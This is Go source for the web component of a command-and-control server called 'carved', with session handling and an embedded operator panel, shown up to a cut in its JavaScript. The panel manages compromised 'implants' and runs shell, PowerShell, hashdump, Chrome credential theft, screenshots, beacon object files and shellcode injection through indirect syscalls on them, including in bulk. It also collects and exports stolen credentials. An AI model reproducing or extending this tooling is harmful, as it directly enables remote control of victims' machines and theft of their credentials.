package web

import (
	"crypto/rand"
	"encoding/hex"
	"net/http"
	"sync"
	"time"
)

var (
	DefaultUsername string
	DefaultPassword string
)

func init() {
	DefaultUsername = generateRandomString(8)
	DefaultPassword = generateRandomString(16)
}

func generateRandomString(length int) string {
	b := make([]byte, length)
	rand.Read(b)
	return hex.EncodeToString(b)[:length]
}

func GetCredentials() (string, string) {
	return DefaultUsername, DefaultPassword
}

var (
	sessions	= make(map[string]time.Time)
	sessionsLock	sync.RWMutex
)

func GenerateSession() string {
	b := make([]byte, 32)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func ValidateSession(token string) bool {
	sessionsLock.RLock()
	defer sessionsLock.RUnlock()

	expiry, exists := sessions[token]
	if !exists {
		return false
	}
	return time.Now().Before(expiry)
}

func CreateSession(token string) {
	sessionsLock.Lock()
	defer sessionsLock.Unlock()
	sessions[token] = time.Now().Add(24 * time.Hour)
}

func DeleteSession(token string) {
	sessionsLock.Lock()
	defer sessionsLock.Unlock()
	delete(sessions, token)
}

func GetSessionFromRequest(r *http.Request) string {
	cookie, err := r.Cookie("session")
	if err != nil {
		return ""
	}
	return cookie.Value
}

func Panel() string {
	return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>carved</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

:root {
  --bg: #0a0a0a;
  --bg-secondary: #111111;
  --bg-tertiary: #161616;
  --border: #1f1f1f;
  --text: #e0e0e0;
  --text-dim: #666666;
  --accent: #ffffff;
  --success: #4ade80;
  --error: #f87171;
  --warning: #fbbf24;
}

body {
  font-family: 'JetBrains Mono', monospace;
  background: var(--bg);
  color: var(--text);
  min-height: 100vh;
  font-size: 13px;
  line-height: 1.6;
}

/* login */
.login-container {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  background: 
    radial-gradient(ellipse at 50% 0%, rgba(255,255,255,0.03) 0%, transparent 50%),
    var(--bg);
}

.login-box {
  width: 320px;
  padding: 40px;
  background: var(--bg-secondary);
  border: 1px solid var(--border);
}

.login-title {
  font-size: 24px;
  font-weight: 300;
  letter-spacing: 4px;
  text-align: center;
  margin-bottom: 40px;
  color: var(--accent);
}

.login-input {
  width: 100%;
  padding: 12px 16px;
  margin-bottom: 16px;
  background: var(--bg);
  border: 1px solid var(--border);
  color: var(--text);
  font-family: inherit;
  font-size: 13px;
  outline: none;
  transition: border-color 0.2s;
}

.login-input:focus {
  border-color: var(--text-dim);
}

.login-input::placeholder {
  color: var(--text-dim);
}

.login-btn {
  width: 100%;
  padding: 12px;
  background: var(--accent);
  color: var(--bg);
  border: none;
  font-family: inherit;
  font-size: 12px;
  font-weight: 500;
  letter-spacing: 2px;
  cursor: pointer;
  transition: opacity 0.2s;
  text-transform: lowercase;
}

.login-btn:hover {
  opacity: 0.9;
}

.login-error {
  color: var(--error);
  font-size: 11px;
  margin-bottom: 16px;
  display: none;
}

/* main layout */
.app {
  display: none;
  min-height: 100vh;
}

.header {
  height: 48px;
  background: var(--bg-secondary);
  border-bottom: 1px solid var(--border);
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 24px;
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  z-index: 100;
}

.logo {
  font-size: 14px;
  font-weight: 400;
  letter-spacing: 3px;
  color: var(--accent);
}

.header-right {
  display: flex;
  align-items: center;
  gap: 24px;
}

.header-stat {
  font-size: 11px;
  color: var(--text-dim);
}

.header-stat span {
  color: var(--text);
}

.logout-btn {
  background: none;
  border: 1px solid var(--border);
  color: var(--text-dim);
  padding: 6px 12px;
  font-family: inherit;
  font-size: 11px;
  cursor: pointer;
  transition: all 0.2s;
}

.logout-btn:hover {
  border-color: var(--text-dim);
  color: var(--text);
}

.main {
  display: flex;
  padding-top: 48px;
  min-height: 100vh;
}

.sidebar {
  width: 200px;
  background: var(--bg-secondary);
  border-right: 1px solid var(--border);
  padding: 24px 0;
  position: fixed;
  top: 48px;
  bottom: 0;
  left: 0;
  overflow-y: auto;
}

.nav-item {
  padding: 10px 24px;
  color: var(--text-dim);
  cursor: pointer;
  font-size: 12px;
  transition: all 0.2s;
  border-left: 2px solid transparent;
}

.nav-item:hover {
  color: var(--text);
  background: var(--bg-tertiary);
}

.nav-item.active {
  color: var(--accent);
  border-left-color: var(--accent);
  background: var(--bg-tertiary);
}

.nav-section {
  padding: 16px 24px 8px;
  font-size: 10px;
  color: var(--text-dim);
  letter-spacing: 1px;
  text-transform: uppercase;
}

.content {
  flex: 1;
  margin-left: 200px;
  padding: 24px;
  background: var(--bg);
}

.page {
  display: none;
}

.page.active {
  display: block;
}

.page-title {
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 24px;
  color: var(--accent);
}

/* tables */
.table-container {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  overflow: hidden;
}

table {
  width: 100%;
  border-collapse: collapse;
}

th {
  text-align: left;
  padding: 12px 16px;
  font-size: 10px;
  font-weight: 500;
  color: var(--text-dim);
  text-transform: uppercase;
  letter-spacing: 1px;
  background: var(--bg-tertiary);
  border-bottom: 1px solid var(--border);
}

td {
  padding: 12px 16px;
  border-bottom: 1px solid var(--border);
  font-size: 12px;
}

tr:last-child td {
  border-bottom: none;
}

tr:hover td {
  background: var(--bg-tertiary);
}

tr.clickable {
  cursor: pointer;
}

.status {
  display: inline-block;
  width: 8px;
  height: 8px;
  border-radius: 50%;
  margin-right: 8px;
}

.status.alive { background: var(--success); }
.status.dead { background: var(--error); }
.status.pending { background: var(--warning); }

tr.dead-row td {
  opacity: 0.5;
}
.status.complete { background: var(--success); }
.status.error { background: var(--error); }
.status.running { background: var(--warning); animation: pulse 1s infinite; }

@keyframes pulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.5; }
}

.elevated {
  color: var(--warning);
}

.badge {
  display: inline-block;
  padding: 2px 8px;
  font-size: 10px;
  border: 1px solid var(--border);
  color: var(--text-dim);
}

.badge.active {
  border-color: var(--success);
  color: var(--success);
}

/* implant detail panel */
.detail-panel {
  display: none;
  position: fixed;
  top: 48px;
  right: 0;
  bottom: 0;
  width: 50%;
  background: var(--bg-secondary);
  border-left: 1px solid var(--border);
  overflow-y: auto;
  z-index: 50;
}

.detail-panel.open {
  display: block;
}

.detail-header {
  padding: 20px 24px;
  border-bottom: 1px solid var(--border);
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.detail-title {
  font-size: 14px;
  color: var(--accent);
}

.close-btn {
  background: none;
  border: none;
  color: var(--text-dim);
  font-size: 20px;
  cursor: pointer;
  padding: 4px 8px;
}

.close-btn:hover {
  color: var(--text);
}

.detail-content {
  padding: 24px;
}

.detail-section {
  margin-bottom: 24px;
}

.detail-section-title {
  font-size: 10px;
  color: var(--text-dim);
  text-transform: uppercase;
  letter-spacing: 1px;
  margin-bottom: 12px;
}

.detail-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
}

.detail-item {
  padding: 12px;
  background: var(--bg);
  border: 1px solid var(--border);
}

.detail-label {
  font-size: 10px;
  color: var(--text-dim);
  margin-bottom: 4px;
}

.detail-value {
  font-size: 12px;
  color: var(--text);
  word-break: break-all;
}

/* command input */
.command-section {
  margin-top: 24px;
  padding-top: 24px;
  border-top: 1px solid var(--border);
}

.command-row {
  display: flex;
  gap: 12px;
  margin-bottom: 12px;
}

.command-select {
  padding: 10px 12px;
  background: var(--bg);
  border: 1px solid var(--border);
  color: var(--text);
  font-family: inherit;
  font-size: 12px;
  min-width: 140px;
  cursor: pointer;
}

.command-input {
  flex: 1;
  padding: 10px 12px;
  background: var(--bg);
  border: 1px solid var(--border);
  color: var(--text);
  font-family: inherit;
  font-size: 12px;
}

.command-input:focus {
  outline: none;
  border-color: var(--text-dim);
}

.command-btn {
  padding: 10px 20px;
  background: var(--accent);
  color: var(--bg);
  border: none;
  font-family: inherit;
  font-size: 11px;
  font-weight: 500;
  cursor: pointer;
  letter-spacing: 1px;
}

.command-btn:hover {
  opacity: 0.9;
}

/* task output */
.task-list {
  max-height: 500px;
  overflow-y: auto;
}

.task-item {
  padding: 16px;
  background: var(--bg);
  border: 1px solid var(--border);
  margin-bottom: 8px;
}

.task-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 8px;
}

.task-type {
  font-size: 11px;
  font-weight: 500;
  color: var(--accent);
}

.task-time {
  font-size: 10px;
  color: var(--text-dim);
}

.task-output {
  font-size: 11px;
  color: var(--text);
  white-space: pre-wrap;
  word-break: break-all;
  background: var(--bg-tertiary);
  padding: 12px;
  max-height: 500px;
  overflow-y: auto;
  border: 1px solid var(--border);
  position: relative;
}

.task-output:hover .copy-btn {
  opacity: 1;
}

.copy-btn {
  position: absolute;
  top: 8px;
  right: 8px;
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  color: var(--text-dim);
  padding: 4px 8px;
  font-size: 10px;
  cursor: pointer;
  opacity: 0;
  transition: opacity 0.2s;
}

.copy-btn:hover {
  color: var(--text);
  border-color: var(--text-dim);
}

/* JSON syntax highlighting */
.json-key { color: #7dd3fc; }
.json-string { color: #a5d6a7; }
.json-number { color: #ffcc80; }
.json-bool { color: #ce93d8; }
.json-null { color: #ef9a9a; }

.task-error {
  color: var(--error);
}

/* listeners page */
.action-bar {
  display: flex;
  justify-content: flex-end;
  margin-bottom: 16px;
}

.action-btn {
  padding: 8px 16px;
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  color: var(--text);
  font-family: inherit;
  font-size: 11px;
  cursor: pointer;
  transition: all 0.2s;
}

.action-btn:hover {
  border-color: var(--text-dim);
}

.action-btn.danger:hover {
  border-color: var(--error);
  color: var(--error);
}

.action-btn.success:hover {
  border-color: var(--success);
  color: var(--success);
}

/* modal */
.modal-overlay {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.8);
  z-index: 200;
  align-items: center;
  justify-content: center;
}

.modal-overlay.open {
  display: flex;
}

.modal {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  padding: 32px;
  min-width: 400px;
}

.modal-title {
  font-size: 16px;
  margin-bottom: 24px;
  color: var(--accent);
}

.form-group {
  margin-bottom: 16px;
}

.form-label {
  display: block;
  font-size: 11px;
  color: var(--text-dim);
  margin-bottom: 6px;
}

.form-input {
  width: 100%;
  padding: 10px 12px;
  background: var(--bg);
  border: 1px solid var(--border);
  color: var(--text);
  font-family: inherit;
  font-size: 12px;
}

.form-input:focus {
  outline: none;
  border-color: var(--text-dim);
}

.modal-actions {
  display: flex;
  gap: 12px;
  justify-content: flex-end;
  margin-top: 24px;
}

/* results page */
.results-tabs {
  display: flex;
  gap: 0;
  margin-bottom: 24px;
  border-bottom: 1px solid var(--border);
}

.results-tab {
  padding: 12px 24px;
  background: none;
  border: none;
  color: var(--text-dim);
  font-family: inherit;
  font-size: 12px;
  cursor: pointer;
  border-bottom: 2px solid transparent;
  margin-bottom: -1px;
  transition: all 0.2s;
}

.results-tab:hover {
  color: var(--text);
}

.results-tab.active {
  color: var(--accent);
  border-bottom-color: var(--accent);
}

.results-panel {
  display: none;
}

.results-panel.active {
  display: block;
}

.empty-state {
  text-align: center;
  padding: 60px 20px;
  color: var(--text-dim);
}

.empty-state-icon {
  font-size: 32px;
  margin-bottom: 16px;
  opacity: 0.3;
}

/* scrollbar */
::-webkit-scrollbar {
  width: 6px;
  height: 6px;
}

::-webkit-scrollbar-track {
  background: var(--bg);
}

::-webkit-scrollbar-thumb {
  background: var(--border);
}

::-webkit-scrollbar-thumb:hover {
  background: var(--text-dim);
}

/* utility */
.mono {
  font-family: 'JetBrains Mono', monospace;
}

.truncate {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  max-width: 200px;
}

/* bofs page */
.bof-layout {
  display: grid;
  grid-template-columns: 1fr 300px;
  gap: 24px;
}

.bof-list-section {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  padding: 16px;
}

.bof-search {
  margin-bottom: 12px;
}

.bof-list {
  max-height: 500px;
  overflow-y: auto;
}

.bof-item {
  padding: 10px 12px;
  border-bottom: 1px solid var(--border);
  cursor: pointer;
  display: flex;
  justify-content: space-between;
  align-items: center;
  transition: background 0.2s;
}

.bof-item:hover {
  background: var(--bg-tertiary);
}

.bof-item.selected {
  background: var(--bg-tertiary);
  border-left: 2px solid var(--accent);
}

.bof-item:last-child {
  border-bottom: none;
}

.bof-name {
  font-size: 12px;
  color: var(--text);
}

.bof-size {
  font-size: 10px;
  color: var(--text-dim);
}

.bof-execute-section {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  padding: 16px;
  height: fit-content;
}

/* shellcode page */
.shellcode-layout {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 24px;
}

.shellcode-section {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  padding: 16px;
}

.shellcode-textarea {
  min-height: 120px;
  resize: vertical;
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px;
}

.shellcode-info {
  margin-top: 12px;
  padding: 8px 12px;
  background: var(--bg);
  border: 1px solid var(--border);
  font-size: 11px;
  color: var(--text-dim);
  min-height: 20px;
}

.method-info {
  margin-top: 8px;
  padding: 8px 12px;
  background: var(--bg);
  border: 1px solid var(--border);
}

.method-desc {
  font-size: 10px;
  color: var(--text-dim);
  line-height: 1.4;
}

/* screenshots page */
.screenshot-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
  gap: 16px;
}

.screenshot-card {
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  overflow: hidden;
  cursor: pointer;
  transition: border-color 0.2s;
}

.screenshot-card:hover {
  border-color: var(--text-dim);
}

.screenshot-img {
  width: 100%;
  height: 200px;
  object-fit: cover;
  display: block;
  background: var(--bg);
}

.screenshot-info {
  padding: 12px;
  border-top: 1px solid var(--border);
}

.screenshot-name {
  font-size: 12px;
  color: var(--text);
  margin-bottom: 4px;
  word-break: break-all;
}

.screenshot-meta {
  font-size: 10px;
  color: var(--text-dim);
}

/* screenshot modal */
.screenshot-modal {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.9);
  z-index: 300;
  align-items: center;
  justify-content: center;
  padding: 40px;
}

.screenshot-modal.open {
  display: flex;
}

.screenshot-modal img {
  max-width: 100%;
  max-height: 100%;
  object-fit: contain;
}

.screenshot-modal-close {
  position: absolute;
  top: 20px;
  right: 20px;
  background: none;
  border: none;
  color: var(--text);
  font-size: 32px;
  cursor: pointer;
}

/* toast notifications */
.toast-container {
  position: fixed;
  top: 60px;
  right: 24px;
  z-index: 1000;
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.toast {
  padding: 12px 16px;
  background: var(--bg-secondary);
  border: 1px solid var(--border);
  border-left: 3px solid var(--accent);
  font-size: 12px;
  color: var(--text);
  animation: slideIn 0.3s ease;
  max-width: 300px;
}

.toast.success {
  border-left-color: var(--success);
}

.toast.error {
  border-left-color: var(--error);
}

.toast.warning {
  border-left-color: var(--warning);
}

@keyframes slideIn {
  from { transform: translateX(100%); opacity: 0; }
  to { transform: translateX(0); opacity: 1; }
}

@keyframes slideOut {
  from { transform: translateX(0); opacity: 1; }
  to { transform: translateX(100%); opacity: 0; }
}
</style>
</head>
<body>

<!-- toast notifications -->
<div class="toast-container" id="toastContainer"></div>

<!-- login -->
<div class="login-container" id="login">
  <div class="login-box">
    <div class="login-title">carved</div>
    <div class="login-error" id="loginError">invalid credentials</div>
    <input type="text" class="login-input" id="username" placeholder="username" autocomplete="off">
    <input type="password" class="login-input" id="password" placeholder="password">
    <button class="login-btn" onclick="login()">authenticate</button>
  </div>
</div>

<!-- main app -->
<div class="app" id="app">
  <header class="header">
    <div class="logo">carved</div>
    <div class="header-right">
      <div class="header-stat">implants: <span id="implantCount">0</span></div>
      <div class="header-stat">listeners: <span id="listenerCount">0</span></div>
      <button class="logout-btn" onclick="logout()">logout</button>
    </div>
  </header>

  <main class="main">
    <nav class="sidebar">
      <div class="nav-section">operations</div>
      <div class="nav-item active" data-page="implants">implants</div>
      <div class="nav-item" data-page="listeners">listeners</div>
      <div class="nav-item" data-page="bofs">bofs</div>
      <div class="nav-item" data-page="shellcode">shellcode</div>
      <div class="nav-section">data</div>
      <div class="nav-item" data-page="results">results</div>
      <div class="nav-item" data-page="credentials">credentials</div>
      <div class="nav-item" data-page="screenshots">screenshots</div>
    </nav>

    <div class="content">
      <!-- implants page -->
      <div class="page active" id="page-implants">
        <h1 class="page-title">implants</h1>
        <div class="action-bar" style="gap:12px">
          <div class="bulk-actions" id="bulkActions" style="display:none;align-items:center;gap:12px">
            <span style="color:var(--text-dim);font-size:11px"><span id="selectedCount">0</span> selected</span>
            <select class="command-select" id="bulkCommandType" style="min-width:120px">
              <option value="shell">shell</option>
              <option value="powershell">powershell</option>
              <option value="hashdump">hashdump</option>
              <option value="chrome">chrome</option>
              <option value="whoami">whoami</option>
              <option value="ps">ps</option>
              <option value="unhook">unhook</option>
              <option value="sleep">sleep</option>
            </select>
            <input type="text" class="command-input" id="bulkCommandArgs" placeholder="args (optional)" style="width:200px">
            <button class="command-btn" onclick="executeBulkCommand()">execute on selected</button>
          </div>
          <button class="action-btn danger" onclick="clearImplants()">clear all</button>
        </div>
        <div class="table-container">
          <table>
            <thead>
              <tr>
                <th style="width:30px"><input type="checkbox" id="selectAllImplants" onchange="toggleSelectAll(this)"></th>
                <th>status</th>
                <th>id</th>
                <th>user</th>
                <th>hostname</th>
                <th>os</th>
                <th>pid</th>
                <th>last seen</th>
              </tr>
            </thead>
            <tbody id="implantsTable"></tbody>
          </table>
        </div>
      </div>

      <!-- listeners page -->
      <div class="page" id="page-listeners">
        <h1 class="page-title">listeners</h1>
        <div class="action-bar">
          <button class="action-btn" onclick="showNewListenerModal()">+ new listener</button>
        </div>
        <div class="table-container">
          <table>
            <thead>
              <tr>
                <th>status</th>
                <th>name</th>
                <th>type</th>
                <th>address</th>
                <th>actions</th>
              </tr>
            </thead>
            <tbody id="listenersTable"></tbody>
          </table>
        </div>
      </div>

      <!-- results page -->
      <div class="page" id="page-results">
        <h1 class="page-title">results</h1>
        <div class="results-tabs">
          <button class="results-tab active" data-results="all">all tasks</button>
          <button class="results-tab" data-results="hashdump">hashdump</button>
          <button class="results-tab" data-results="chrome">chrome</button>
          <button class="results-tab" data-results="shell">shell</button>
          <button class="results-tab" data-results="bof">bof</button>
        </div>
        <div class="results-panel active" id="results-all">
          <div id="allResultsList"></div>
        </div>
        <div class="results-panel" id="results-hashdump">
          <div id="hashdumpResultsList"></div>
        </div>
        <div class="results-panel" id="results-chrome">
          <div class="action-bar">
            <button class="action-btn" onclick="exportChromeResults()">export json</button>
          </div>
          <div id="chromeResultsList"></div>
        </div>
        <div class="results-panel" id="results-shell">
          <div id="shellResultsList"></div>
        </div>
        <div class="results-panel" id="results-bof">
          <div id="bofResultsList"></div>
        </div>
      </div>

      <!-- credentials page -->
      <div class="page" id="page-credentials">
        <h1 class="page-title">credentials</h1>
        <div class="action-bar">
          <button class="action-btn" onclick="exportCredentials()">export csv</button>
        </div>
        <div class="table-container">
          <table>
            <thead>
              <tr>
                <th>source</th>
                <th>domain</th>
                <th>username</th>
                <th>secret</th>
                <th>type</th>
              </tr>
            </thead>
            <tbody id="credentialsTable"></tbody>
          </table>
        </div>
      </div>

      <!-- screenshots page -->
      <div class="page" id="page-screenshots">
        <h1 class="page-title">screenshots</h1>
        <div class="screenshot-grid" id="screenshotGrid"></div>
      </div>

      <!-- bofs page -->
      <div class="page" id="page-bofs">
        <h1 class="page-title">beacon object files</h1>
        <div class="bof-layout">
          <div class="bof-list-section">
            <div class="detail-section-title">available bofs</div>
            <div class="bof-search">
              <input type="text" class="form-input" id="bofSearch" placeholder="search bofs..." oninput="filterBOFs()">
            </div>
            <div class="bof-list" id="bofList"></div>
          </div>
          <div class="bof-execute-section">
            <div class="detail-section-title">execute bof</div>
            <div class="form-group">
              <label class="form-label">selected bof</label>
              <input type="text" class="form-input" id="selectedBof" readonly placeholder="select a bof from the list">
            </div>
            <div class="form-group">
              <label class="form-label">target implant</label>
              <select class="form-input" id="bofTargetImplant">
                <option value="">select implant...</option>
              </select>
            </div>
            <div class="form-group">
              <label class="form-label">arguments (optional)</label>
              <input type="text" class="form-input" id="bofArgs" placeholder="arg1 arg2 ...">
            </div>
            <button class="command-btn" onclick="executeBOF()" style="width:100%;margin-top:12px">execute</button>
          </div>
        </div>
      </div>

      <!-- shellcode page -->
      <div class="page" id="page-shellcode">
        <h1 class="page-title">shellcode execution</h1>
        <div class="shellcode-layout">
          <div class="shellcode-section">
            <div class="detail-section-title">shellcode input</div>
            <div class="form-group">
              <label class="form-label">upload file</label>
              <input type="file" class="form-input" id="shellcodeFile" accept=".bin,.raw,.sc,.shellcode" onchange="handleShellcodeFile(event)" style="padding:8px">
            </div>
            <div style="text-align:center;color:var(--text-dim);font-size:10px;margin:12px 0">— or paste below —</div>
            <div class="form-group">
              <textarea class="form-input shellcode-textarea" id="shellcodeData" placeholder="supported formats:&#10;- raw hex: 4831c050...&#10;- spaced hex: 48 31 c0 50...&#10;- \x format: \x48\x31\xc0...&#10;- 0x format: 0x48,0x31,0xc0...&#10;- base64: SDHAUEiJ5Q==" oninput="detectShellcodeFormat()"></textarea>
            </div>
            <div class="shellcode-info" id="shellcodeInfo">no shellcode loaded</div>
          </div>
          <div class="shellcode-section">
            <div class="detail-section-title">execution options</div>
            <div class="form-group">
              <label class="form-label">target implant</label>
              <select class="form-input" id="shellcodeTargetImplant">
                <option value="">select implant...</option>
              </select>
            </div>
            <div class="form-group">
              <label class="form-label">injection method</label>
              <select class="form-input" id="shellcodeMethod">
                <option value="indirect">indirect syscall</option>
                <option value="enclave">enclave injection</option>
                <option value="once">rtl run once</option>
              </select>
            </div>
            <div class="method-info" id="methodInfo">
              <div class="method-desc" id="methodDesc">ntallocatevirtualmemory + rtlcreateuserthread via indirect syscalls. recommended for most scenarios.</div>
            </div>
            <button class="command-btn" onclick="executeShellcode()" style="width:100%;margin-top:16px">execute</button>
            <div style="margin-top:12px;padding:10px;background:var(--bg);border:1px solid var(--border);font-size:10px;color:var(--text-dim)">
              <strong style="color:var(--warning)">warning:</strong> shellcode runs in implant process. test payloads carefully.
            </div>
          </div>
        </div>
      </div>
    </div>
  </main>

  <!-- implant detail panel -->
  <div class="detail-panel" id="detailPanel">
    <div class="detail-header">
      <div class="detail-title" id="detailTitle">implant details</div>
      <button class="close-btn" onclick="closeDetail()">&times;</button>
    </div>
    <div class="detail-content">
      <div class="detail-section">
        <div class="detail-section-title">system info</div>
        <div class="detail-grid" id="detailGrid"></div>
      </div>
      
      <div class="command-section">
        <div class="detail-section-title">execute command</div>
        <div class="command-row">
          <select class="command-select" id="commandType">
            <option value="shell">shell</option>
            <option value="powershell">powershell</option>
            <option value="ls">ls</option>
            <option value="cat">cat</option>
            <option value="cd">cd</option>
            <option value="pwd">pwd</option>
            <option value="ps">ps</option>
            <option value="whoami">whoami</option>
            <option value="env">env</option>
            <option value="hashdump">hashdump</option>
            <option value="chrome">chrome</option>
            <option value="screenshot">screenshot</option>
            <option value="unhook">unhook</option>
            <option value="sleep">sleep</option>
          </select>
          <input type="text" class="command-input" id="commandArgs" placeholder="arguments (optional)">
          <button class="command-btn" onclick="sendCommand()">execute</button>
        </div>
      </div>

      <div class="detail-section">
        <div class="detail-section-title">task history</div>
        <div class="task-list" id="taskList"></div>
      </div>
    </div>
  </div>
</div>

<!-- new listener modal -->
<div class="modal-overlay" id="newListenerModal">
  <div class="modal">
    <div class="modal-title">new listener</div>
    <div class="form-group">
      <label class="form-label">name</label>
      <input type="text" class="form-input" id="listenerName" placeholder="http-listener">
    </div>
    <div class="form-group">
      <label class="form-label">type</label>
      <select class="form-input" id="listenerType">
        <option value="http">http</option>
      </select>
    </div>
    <div class="form-group">
      <label class="form-label">host</label>
      <input type="text" class="form-input" id="listenerHost" value="0.0.0.0">
    </div>
    <div class="form-group">
      <label class="form-label">port</label>
      <input type="number" class="form-input" id="listenerPort" value="8443">
    </div>
    <div class="modal-actions">
      <button class="action-btn" onclick="closeNewListenerModal()">cancel</button>
      <button class="command-btn" onclick="createListener()">create</button>
    </div>
  </div>
</div>

<!-- screenshot viewer modal -->
<div class="screenshot-modal" id="screenshotModal" onclick="closeScreenshotModal()">
  <button class="screenshot-modal-close" onclick="closeScreenshotModal()">&times;</button>
  <img id="screenshotModalImg" src="" alt="screenshot">
</div>

<script>
let currentImplant = null;
let pollInterval = null;

// auth
async function login() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  
  try {
    const res = await fetch('/auth/login', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({username, password})
    });
    
    if (res.ok) {
      document.getElementById('login').style.display = 'none';
      document.getElementById('app').style.display = 'block';
      startPolling();
    } else {
      document.getElementById('loginError').style.display = 'block';
    }
  } catch (e) {
    document.getElementById('loginError').style.display = 'block';
  }
}

async function logout() {
  await fetch('/auth/logout', {method: 'POST'});
  stopPolling();
  document.getElementById('app').style.display = 'none';
  document.getElementById('login').style.display = 'flex';
  document.getElementById('username').value = '';
  document.getElementById('password').value = '';
}

async function checkAuth() {
  try {
    const res = await fetch('/auth/check');
    if (res.ok) {
      document.getElementById('login').style.display = 'none';
      document.getElementById('app').style.display = 'block';
      startPolling();
    }
  } catch (e) {}
}

// navigation
document.querySelectorAll('.nav-item').forEach(item => {
  item.addEventListener('click', () => {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    item.classList.add('active');
    document.getElementById('page-' + item.dataset.page).classList.add('active');
    closeDetail();
  });
});

// results tabs
document.querySelectorAll('.results-tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.results-tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.results-panel').forEach(p => p.classList.remove('active'));
    tab.classList.add('active');
    document.getElementById('results-' + tab.dataset.results).classList.add('active');
  });
});

// polling
function startPolling() {
  loadData();
  pollInterval = setInterval(loadData, 5000);
}

function stopPolling() {
  if (pollInterval) clearInterval(pollInterval);
}

async function loadData() {
  await Promise.all([
    loadImplants(),
    loadListeners(),
    loadCredentials(),
    loadAllResults(),
    loadBOFs(),
    loadScreenshots(),
    updateShellcodeImplantSelect()
  ]);
  
  if (currentImplant) {
    loadImplantTasks(currentImplant.id);
  }
}

// api calls
async function api(endpoint) {
  const res = await fetch('/api' + endpoint);
  const data = await res.json();
  return data.success ? data.data : [];
}

async function apiPost(endpoint, body) {
  const res = await fetch('/api' + endpoint, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(body)
  });
  return await res.json();
}

async function apiDelete(endpoint) {
  const res = await fetch('/api' + endpoint, {method: 'DELETE'});
  return await res.json();
}

const DEAD_THRESHOLD_MS = 120000;

function isImplantAlive(implant) {
  if (!implant.last_seen) return false;
  const lastSeen = new Date(implant.last_seen).getTime();
  const now = Date.now();
  return (now - lastSeen) < DEAD_THRESHOLD_MS;
}

async function loadImplants() {
  const implants = await api('/implants') || [];
  implants.forEach(i => { i.alive = isImplantAlive(i); });
  const aliveCount = implants.filter(i => i.alive).length;
  document.getElementById('implantCount').textContent = aliveCount;
  
  const tbody = document.getElementById('implantsTable');
  if (implants.length === 0) {
    tbody.innerHTML = '<tr><td colspan="8" style="text-align:center;color:var(--text-dim);padding:40px"><div style="margin-bottom:8px">no implants connected</div><div style="font-size:10px">deploy a stager to receive callbacks</div></td></tr>';
    return;
  }
  
  tbody.innerHTML = implants.map(i => ` + "`" + `
    <tr class="clickable ${i.alive ? '' : 'dead-row'}">
      <td onclick="event.stopPropagation()"><input type="checkbox" class="implant-checkbox" data-id="${i.id}" data-alive="${i.alive}" onchange="updateBulkSelection()" ${i.alive ? '' : 'disabled'}></td>
      <td onclick="selectImplant('${i.id}')"><span class="status ${i.alive ? 'alive' : 'dead'}"></span>${i.alive ? 'alive' : 'dead'}</td>
      <td onclick="selectImplant('${i.id}')" class="truncate">${i.id.substring(0,8)}</td>
      <td onclick="selectImplant('${i.id}')">${i.elevated ? '<span class="elevated">*</span>' : ''}${i.username}</td>
      <td onclick="selectImplant('${i.id}')">${i.hostname}</td>
      <td onclick="selectImplant('${i.id}')">${i.os}/${i.arch}</td>
      <td onclick="selectImplant('${i.id}')">${i.pid}</td>
      <td onclick="selectImplant('${i.id}')">${formatTime(i.last_seen)}</td>
    </tr>
  ` + "`" + `).join('');
  
  updateBulkSelection();
}

async function selectImplant(id) {
  const implants = await api('/implants');
  currentImplant = implants.find(i => i.id === id);
  
  if (!currentImplant) return;
  
  document.getElementById('detailTitle').textContent = currentImplant.username + '@' + currentImplant.hostname;
  
  const grid = document.getElementById('detailGrid');
  grid.innerHTML = ` + "`" + `
    <div class="detail-item"><div class="detail-label">id</div><div class="detail-value">${currentImplant.id}</div></div>
    <div class="detail-item"><div class="detail-label">hostname</div><div class="detail-value">${currentImplant.hostname}</div></div>
    <div class="detail-item"><div class="detail-label">username</div><div class="detail-value">${currentImplant.elevated ? '* ' : ''}${currentImplant.username}</div></div>
    <div class="detail-item"><div class="detail-label">domain</div><div class="detail-value">${currentImplant.domain || '-'}</div></div>
    <div class="detail-item"><div class="detail-label">os</div><div class="detail-value">${currentImplant.os}/${currentImplant.arch}</div></div>
